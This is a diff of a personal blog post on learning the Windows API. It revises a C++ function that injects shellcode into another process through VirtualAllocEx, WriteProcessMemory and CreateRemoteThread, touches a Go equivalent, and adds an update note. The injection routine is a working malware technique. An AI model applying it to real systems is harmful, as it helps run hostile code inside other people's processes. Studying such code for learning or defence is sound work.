@@ -39,7 +39,7 @@ As a side note, while we&amp;rsquo;re talking about development, I recently deci
 It&rsquo;s APIs to be precise, as I am trying to move out of my comfort zone of &ldquo;development&rdquo; (I am by no means a developer, but when I make stuff, it&rsquo;s usually on Linux).
 As a side note, while we&rsquo;re talking about development, I recently decided to produce a rip-off of the amazing xsshunter and write it in Go."><meta itemprop="datePublished" content="2021-06-01T00:41:45&#43;02:00" />
 <meta itemprop="dateModified" content="2021-06-01T00:41:45&#43;02:00" />
-<meta itemprop="wordCount" content="865">
+<meta itemprop="wordCount" content="981">
 <meta itemprop="keywords" content="3,windows,api,clueless,cpp,c&#43;&#43;,go," />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Approaching Windows"/>
@@ -150,41 +150,36 @@ To do this we will need a way obtain a handle of a give process (<strong>OpenPro
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;memoryapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold"></span>
 <span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
-	HANDLE hProc;
+	HANDLE hProc, hThread;
 	LPVOID lpStartAddress;
 	<span style="color:#6ab825;font-weight:bold">int</span> writeProcError;
 	DWORD lpflOldProtect = PAGE_READWRITE;
-	
+
 	<span style="color:#999;font-style:italic">//Get a handle from the given pid
-</span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	<span style="color:#6ab825;font-weight:bold">if</span>(!hProc) {
+</span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
+	<span style="color:#6ab825;font-weight:bold">if</span> (!hProc) {
 		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 	}
-	
+
 	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.	
-</span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+</span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	<span style="color:#6ab825;font-weight:bold">if</span> (lpStartAddress == <span style="color:#24909d">NULL</span>) {
 		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">2</span>;
 	}
-	
+
 	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process,
-</span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>)
+</span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>);
 	<span style="color:#6ab825;font-weight:bold">if</span> (writeProcError == <span style="color:#3677a9">0</span>) {
 		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">3</span>;
-	}
-	
-	<span style="color:#999;font-style:italic">//Change the memory to be executable
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#6ab825;font-weight:bold">if</span> (VirtualProtectEx(hProc, lpStartAddress, sh_size, PAGE_EXECUTE_READ, (PDWORD)&amp;lpflOldProtect) == <span style="color:#3677a9">0</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">4</span>;
 	}
 
 	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
 </span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
-</span><span style="color:#999;font-style:italic"></span>
-	<span style="color:#6ab825;font-weight:bold">if</span> (CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>, lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>) == <span style="color:#24909d">NULL</span>) {
+</span><span style="color:#999;font-style:italic"></span>	hThread = CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
+	<span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
 		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">5</span>;
 	}
-	
+
 	<span style="color:#999;font-style:italic">//Close the open handles
 </span><span style="color:#999;font-style:italic"></span>	CloseHandle(hProc);
 
@@ -240,6 +235,7 @@ To do this we will need a way obtain a handle of a give process (<strong>OpenPro
 	}
 
 	<span style="color:#999;font-style:italic">//Change the memory to be executable
+</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
 </span><span style="color:#999;font-style:italic"></span>	_, _, err = virtualProtectEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.PAGE_EXECUTE_READ, <span style="color:#24909d">uintptr</span>(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;memProtect)))
 	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
 		<span style="color:#6ab825;font-weight:bold">return</span> err
@@ -264,6 +260,12 @@ To do this we will need a way obtain a handle of a give process (<strong>OpenPro
 <p>Anyhow, Windows makes it generally pretty straight forward to perform operations on remote processes, no wonder userspace malwares are so popular! They are easy to implement, quick to develop and if they get caught, well&hellip; just make a new one.</p>
 <p>I do plan on eventually sharing other snippets for stuff I find interesting, Windows-related&hellip; this is if I don&rsquo;t get slapped to numbness with a printed version of MSDN by my friend that has been trying to get me to learn all this shit.</p>
 <p>Over and out.</p>
+<hr>
+<p><strong>Update:</strong></p>
+<p>As I was testing (and correcting) the C++ code I noticed there was a useless step in the function: I was allocating an area as Read-Write and only later modifying it to be executable.
+This was indeed unneeded.</p>
+<p>While it worked, one can totally skip the <strong>VirtualProtectEx</strong> in the go version, and just do as the updated C++ code: calling VirtualAlloc with <code>PAGE_EXECUTE_READ_WRITE</code>.</p>
+<p>I&rsquo;ll leave the Go version as a reference for stupid code and use this as an excuse to avoid modifying it because I really want to watch another episode of Battle Star Galactica, instead of removing a few lines of code. I&rsquo;m lazy, fight me&hellip;or don&rsquo;t, it&rsquo;s less tiring.</p>
 
       </div>
     </article>
@@ -295,7 +297,7 @@ To do this we will need a way obtain a handle of a give process (<strong>OpenPro
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        865 Words
+        981 Words
       </p>
 
       <p>
